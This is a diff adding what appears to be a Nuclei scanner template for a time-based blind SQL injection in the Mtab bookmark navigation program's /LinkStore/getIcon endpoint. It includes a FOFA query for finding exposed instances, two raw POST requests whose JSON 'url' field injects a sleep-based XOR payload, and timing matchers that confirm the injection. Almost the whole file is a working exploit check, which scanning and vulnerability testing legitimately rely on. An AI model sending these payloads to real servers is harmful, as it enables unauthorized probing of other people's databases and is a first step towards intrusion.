@@ -1,0 +1,42 @@
+id: Mtab-LinkStore_getIcon-sql
+
+info:
+  name: Mtab书签导航程序 LinkStore/getIcon SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="Mtab书签"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /LinkStore/getIcon HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"url":"'XOR(if(now()=sysdate(),sleep(4),0))XOR'"}
+
+      - |
+        POST /LinkStore/getIcon HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"url":"'XOR(if(now()=sysdate(),sleep(8),0))XOR'"}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
+
+
+
